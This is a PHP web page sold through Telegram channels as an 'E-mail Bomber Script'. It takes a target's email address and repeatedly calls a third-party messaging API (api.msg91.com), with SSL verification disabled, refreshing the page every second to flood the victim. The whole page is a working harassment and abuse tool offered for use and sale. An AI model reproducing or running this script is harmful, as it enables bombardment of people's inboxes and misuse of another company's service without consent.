<DOCTYPE html>
<html>
<head> <meta name='viewport' content='width=device-width'>
<title>EARNING_SCRIPTER[OFFICIAL]</title>
<link href="style.css" rel="stylesheet">
<style>
a{
	background: red;
	color: white;
	border: 2px solid black;
	border-radius: 5px;
	font-weight:  bold;
}



</style>
</head>
<body>
<h2>EARNING_SCRIPTER</h2>

<h3>E-mail Bomber Script</h3>
<?php
if(isset($_POST['submit'])){
  $mail = $_POST['mail'];
  
  
    function RandomNumber($length)
{
$str="";
for($i=0;$i<$length;$i++){
$str.=mt_rand(0,9);
}
return $str;
}
$n = array('charan','raaghu','sumit','chandru','rishab','tanmay','ravi','riya','deepak','shashi','revanth','smitha','gowri','arun','arpitha','anusha','chinmay','thilak','manu','mithun','rahul','abhishek','kavya','kavitha','savitha','sachin','manohar','ajay','anurag','madhu','kushal','anil','askash','yogesh','vidya','rajesh','sagar','madhan','vishal','ramya','riyanth','ravishankar','radha','raju','sudha','avinash','fidju','arihanth','babu','priya','preethi','priyanka','preetham','suman','sunitha','tanu','manu','mahesh','mahendra','manoj','vikas','abhinav','arya','raaghu','sumit','chandru','rishab','tanmay','ravi','riya','deepak','shashi','revanth','smitha','gowri','arun','arpitha','anusha','chinmay','thilak','manu','mithun','rahul','abhishek','kavya','kavitha','savitha','sachin','manohar','ajay','anurag','madhu','kushal','anil','askash','yogesh','vidya','rajesh','sagar','madhan','vishal','ramya','riyanth','ravishankar','radha','raju','sudha','avinash','fidju','arihanth','babu','priya','preethi','priyanka','ananth','sumana','saritha','yogesh','razz');
$fname = $n[mt_rand(0,count($n))];	



$imei=RandomNumber(10);
$id=RandomNumber(8);
$host='api.msg91.com';

$url5='http://api.msg91.com/action_layer.php?action=601';
 
$data5='username='.$mail.'';

$headers5=['Content-length: '.strlen($data5).'','Content-Type: application/x-www-form-urlencoded; charset=UTF-8','Host: '
.$host.'','Connection: Keep-Alive',];

 $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL,$url5);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $data5);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_HTTPHEADER,$headers5);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $output= curl_exec ($ch);
  $json=json_decode($output,true);
 $msg = $json['msg'];
 $msg_type = $json['msg_type'];
 $date = $json['data']['date'];
  curl_close ($ch);
  

echo"
<font color='green'size='3'><hr>Msg => $msg<hr>
<font color='red'size='3'><hr>Date => $date<hr>
<font color='black'size='3'><hr>Msg_Type => $msg_type<hr><a href='https://t.me/EarningScripte'>Want To Buy Php Click Here</a><hr>
";


echo "<meta http-equiv='refresh' content=1;' />";


	
 
}

if(!isset($_POST['submit'])){
  echo'<form action="" method="POST"/>
 <input type="text" name="mail" placeholder="Enter Gmail Id"required/>
 <br><br>
 
  
 
 <input type="submit" name="submit" value="SEND"/>
   </form>
  ';
}
?>
<a href="https://t.me/EarningScripte"/>Made By :- @EarningScripte</a>
<br><br>
<center><script type='text/javascript'>(function() {var script=document.createElement('script');script.type='text/javascript';script.async =true;script.src='//telegram.im/widget-button/index.php?id=@EarningScripte';document.getElementsByTagName('head')[0].appendChild(script);})();</script><a href='tg://resolve?domain=EarningScripte' target='_blank' class='telegramim_button telegramim_shadow telegramim_pulse' style='font-size:18px;max-width:400px;background:#000000;box-shadow:3px 3px 7px #F40202;color:#17ffd1;border-radius:20px;' title='Join Now'><i></i> Join Earning Scripter Telegram Channel For Scripts<small><span class='telegramim_count' data-for='@EarningScripte'>...</span> Members</small></a></center>


<hr><center><script type='text/javascript'>(function() {var script=document.createElement('script');script.type='text/javascript';script.async =true;script.src='//telegram.im/widget-button/index.php?id=@EarningScripte';document.getElementsByTagName('head')[0].appendChild(script);})();</script><a href='https://youtube.com/channel/UCCIgtMSuWkZYoaa_CTGTNnQ' target='_blank' class='telegramim_button telegramim_shadow telegramim_pulse' style='font-size:18px;max-width:400px;background:red;box-shadow:3px 3px 7px #052EF0;color:white;border-radius:0px;' title='Join Now'><i></i> Join Earning scripter Youtube Channel For Scripts<small><span class='telegramim_count' data-for='@EarningScripte'>...</span> Members</small></a></center>


<br>
</body>
</html> 